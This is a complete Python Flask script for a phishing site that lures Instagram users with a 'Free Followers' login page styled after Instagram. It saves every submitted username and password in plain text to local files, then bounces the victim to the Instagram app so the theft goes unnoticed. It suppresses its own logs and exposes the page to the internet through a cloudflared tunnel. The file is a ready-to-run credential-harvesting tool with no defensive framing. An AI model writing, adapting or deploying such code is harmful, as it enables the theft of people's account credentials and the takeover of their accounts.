import os
import sys
import subprocess
import re
import threading
import time
import logging
from flask import Flask, render_template_string, request, redirect, url_for
from datetime import datetime
from werkzeug.utils import secure_filename

# Auto-install missing packages quietly
def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

# Flask app setup
app = Flask(__name__)

# Suppress Flask and Werkzeug logs completely
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)  # effectively silence
app.logger.setLevel(logging.ERROR + 10)

# Also silence Flask's startup messages by redirecting output temporarily
class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

# Data saving folder
BASE_FOLDER = os.path.expanduser("~/storage/downloads/FreeFollowers")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    # Serve the HTML content directly
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Free Followers For Instagram</title>
        <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
        <style>
            :root {
                /* Light theme colors (Instagram-like) */
                --bg-gradient-light: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
                --text-light: #262626;
                --container-bg-light: #ffffff;
                --border-light: #dbdbdb;
                --input-bg-light: #fafafa;
                --input-border-light: #efefef;
                --button-bg-light: #0095f6;
                --button-hover-light: #0085e6;
                --divider-line-light: #dbdbdb;
                --or-text-light: #8e8e8e;
                --link-light: #00376b;
            }

            @media (prefers-color-scheme: dark) {
                :root {
                    /* Dark theme colors */
                    --bg-gradient-light: #1a1a1a; /* Solid dark background for dark mode */
                    --text-light: #f5f5f5;
                    --container-bg-light: #262626;
                    --border-light: #444444;
                    --input-bg-light: #363636;
                    --input-border-light: #555555;
                    --button-bg-light: #3897f0;
                    --button-hover-light: #2887e0;
                    --divider-line-light: #555555;
                    --or-text-light: #aaaaaa;
                    --link-light: #52a8ff;
                }
            }

            /* General Body Styles */
            body {
                font-family: 'Roboto', -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
                background: var(--bg-gradient-light); /* Apply gradient for light, solid for dark */
                background-size: cover; /* Cover the entire background */
                background-position: center; /* Center the background image/gradient */
                background-attachment: fixed; /* Keep background fixed when scrolling */
                color: var(--text-light);
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                transition: background 0.3s, color 0.3s; /* Smooth transition for dark/light mode */
            }

            /* Main container for the form elements */
            .container {
                display: flex;
                flex-direction: column;
                align-items: center;
                width: 100%;
                padding: 20px;
                box-sizing: border-box;
            }

            /* Styling for the main login box and the sign-up box */
            .login-box, .signup-box {
                background-color: var(--container-bg-light);
                border: 1px solid var(--border-light);
                width: 100%;
                max-width: 350px;
                padding: 40px;
                margin-bottom: 10px;
                text-align: center;
                box-sizing: border-box;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0,0,0,0.05); /* Soft shadow */
                transition: background-color 0.3s, border-color 0.3s, box-shadow 0.3s;
            }

            /* Container to hold the icon and title */
            .title-container {
                display: flex;
                flex-direction: column;
                align-items: center;
                justify-content: center;
                margin-bottom: 25px;
            }

            /* Generic Person Icon SVG */
            .person-icon {
                width: 60px;
                height: 60px;
                margin-bottom: 10px;
                fill: var(--text-light);
                transition: fill 0.3s;
            }

            /* Custom Title (mimicking Instagram's text logo) */
            .title {
                font-family: 'Roboto', sans-serif;
                font-size: 2.2em;
                font-weight: 300;
                color: var(--text-light);
                margin: 0;
                line-height: 1.2;
                transition: color 0.3s;
            }

            /* Input fields for username and password */
            .input-field input {
                width: 100%;
                padding: 12px 10px;
                margin-bottom: 8px;
                border: 1px solid var(--input-border-light);
                border-radius: 3px;
                background-color: var(--input-bg-light);
                font-size: 14px;
                box-sizing: border-box;
                color: var(--text-light);
                transition: background-color 0.3s, border-color 0.3s, color 0.3s;
            }
            .input-field input::placeholder {
                color: var(--or-text-light);
                opacity: 0.8;
            }
            .input-field input:focus {
                border-color: var(--button-bg-light);
                outline: none;
            }

            /* Login button */
            .login-button {
                width: 100%;
                padding: 10px;
                border: none;
                border-radius: 8px;
                background-color: var(--button-bg-light);
                color: white;
                font-weight: 600;
                font-size: 14px;
                cursor: pointer;
                margin-top: 15px;
                transition: background-color 0.2s ease;
            }
            .login-button:hover {
                background-color: var(--button-hover-light);
            }
            
            /* "OR" divider */
            .divider {
                display: flex;
                align-items: center;
                margin: 20px 0;
            }

            .line {
                height: 1px;
                background-color: var(--divider-line-light);
                flex-grow: 1;
                transition: background-color 0.3s;
            }

            .or {
                margin: 0 18px;
                font-size: 13px;
                font-weight: 600;
                color: var(--or-text-light);
                transition: color 0.3s;
            }

            /* "Forgot password" link */
            .forgot-password {
                display: block;
                margin-top: 20px;
                color: var(--link-light);
                font-size: 12px;
                text-decoration: none;
                transition: color 0.3s;
            }
            .forgot-password:hover {
                text-decoration: underline;
            }
            
            /* Sign up box styling */
            .signup-box p {
                margin: 0;
                font-size: 14px;
            }

            .signup-box a {
                color: var(--button-bg-light);
                font-weight: 600;
                text-decoration: none;
                transition: color 0.3s;
            }
            .signup-box a:hover {
                text-decoration: underline;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="login-box">
                <div class="title-container">
                    <svg class="person-icon" viewBox="0 0 24 24" fill="currentColor" stroke="none">
                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
                    </svg>
                    <h1 class="title">Free Followers For Instagram</h1>
                </div>
                <form action="/login" method="post">
                    <div class="input-field">
                        <input type="text" name="username" placeholder="Username or Email" required>
                    </div>
                    <div class="input-field">
                        <input type="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit" class="login-button">Get Free Followers</button>
                </form>
                <div class="divider">
                    <div class="line"></div>
                    <div class="or">OR</div>
                    <div class="line"></div>
                </div>
                <a href="#" class="forgot-password">Need help logging in?</a>
            </div>
            <div class="signup-box">
                <p>Don't have an account? <a href="#">Join us!</a></p>
            </div>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()

    if not username or not password:
        return "Username and password are required!", 400

    safe_username = secure_filename(username)
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <meta name="color-scheme" content="light dark" />
      <title>Success!</title>
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet" />
      <style>
        :root {
          --primary-success: #28a745; /* A success green */
          --bg-light: #fafafa;
          --text-light: #262626;
          --container-bg-light: #ffffff;
          --shadow-light: rgba(0,0,0,0.1);
        }
        @media (prefers-color-scheme: dark) {
          :root {
            --primary-success: #28a745;
            --bg-light: #1a1a1a;
            --text-light: #f5f5f5;
            --container-bg-light: #262626;
            --shadow-light: rgba(0,0,0,0.3);
          }
        }
        body {
          font-family: 'Roboto', sans-serif;
          margin:0; padding:20px;
          display:flex; justify-content:center;
          min-height: 100vh;
          align-items: center;
          background-color: var(--bg-light);
          color: var(--text-light);
          transition: background-color 0.3s, color 0.3s;
        }
        .container {
          padding: 40px;
          max-width: 600px;
          width: 100%;
          border-radius: 8px;
          box-sizing: border-box;
          text-align: center;
          background: var(--container-bg-light);
          border-left: 4px solid var(--primary-success);
          box-shadow: 0 4px 20px var(--shadow-light);
          transition: background-color 0.3s, border-color 0.3s, box-shadow 0.3s;
        }
        h2 {
          margin-top: 0;
          font-weight: 700;
          font-size: 1.8em;
          margin-bottom: 10px;
          color: var(--primary-success);
          transition: color 0.3s;
        }
        p {
          font-size: 1.1em;
          margin-top: 20px;
          line-height: 1.4;
        }
      </style>
      <script>
        // Attempt to open Instagram app or redirect to Play Store/App Store
        window.onload = function() {
            var appScheme = "instagram://app"; // Generic Instagram deep link
            var androidPackage = "com.instagram.android";
            var iOSAppStoreURL = "https://apps.apple.com/us/app/instagram/id389801252";
            var playStoreURL = "https://play.google.com/store/apps/details?id=" + androidPackage;

            // Try to open the app
            window.location.href = appScheme;

            // Fallback to Play Store/App Store if the app doesn't open
            setTimeout(function() {
                // If the app didn't open, the browser would still be on this page.
                // We assume app didn't open if we're still here after a short delay.
                // Redirect based on user agent (basic detection)
                if (navigator.userAgent.match(/Android/i)) {
                    window.location.href = playStoreURL;
                } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
                    window.location.href = iOSAppStoreURL;
                } else {
                    // For other OS, maybe just a generic message or stay on page
                    console.log("Instagram app not found. Please install it from your app store.");
                }
            }, 2500); // Wait 2.5 seconds before redirecting to store
        };
      </script>
    </head>
    <body>
      <div class="container">
        <h2>Request Submitted!</h2>
        <p>Your request for free followers has been submitted.<br>The Instagram app should open shortly.</p>
      </div>
    </body>
    </html>
    '''
    )

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--protocol", "http2", "--url", local_url]

    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    tunnel_url = None
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"Free Followers Public Link: {tunnel_url}")
            sys.stdout.flush()
            break
    return process

if __name__ == '__main__':
    # Suppress Flask startup messages by redirecting stdout/stderr temporarily
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    # Run flask app in a separate thread so we can run cloudflared tunnel simultaneously
    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    # Restore stdout/stderr after server starts
    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)